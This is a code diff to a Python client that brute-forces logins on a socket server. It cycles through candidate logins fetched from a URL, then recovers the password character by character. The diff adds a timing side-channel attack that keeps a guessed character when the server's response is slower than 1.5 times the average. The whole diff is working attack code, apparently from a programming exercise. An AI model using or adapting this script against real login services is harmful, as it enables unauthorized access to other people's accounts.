@@ -5,6 +5,7 @@ import string
 import itertools
 import requests
 import json
+import time
 
 BUFFER_SIZE = 1024
 MAX_NUM_PASSWORDS = 1_000_000
@@ -38,9 +39,16 @@ test = {
     "password": ""
 }
 
+times = []
+
+def time_average():
+    return sum(times) / len(times)
+
+
 def make_connection(ip, port):
     with socket.socket() as client_socket:
         client_socket.connect((ip, port))
+        # find login
         for login in get_logins_from_url(LOGINS_URL):
             test["login"] = login
             client_socket.send(json.dumps(test).encode())
@@ -54,18 +62,31 @@ def make_connection(ip, port):
                 break
 
         # case when login is found but password is not
+
+
         while response['result'] != "Connection success!":
             for letter in string.ascii_letters + string.digits:
                 test["password"] += letter
+
+                _start = time.perf_counter()
                 client_socket.send(json.dumps(test).encode())
                 response = json.loads(client_socket.recv(BUFFER_SIZE).decode())
+                _stop = time.perf_counter()
+                times.append(_stop - _start)
+
                 if response['result'] == "Connection success!":
                     return json.dumps(test)
                 elif response['result'] == "Wrong password!":
-                    test["password"] = test["password"][:-1]
-                    continue
-                elif response['result'] == "Exception happened during login":
+                    if times[-1] < time_average() * 1.5:
+                        test["password"] = test["password"][:-1]
+                        continue
                     break
+                else:
+                    raise Exception("Unpredicted response: " + response['result'])
+
+                #elif response['result'] == "Exception happened during login":
+                #    break
+
 
     return None
 
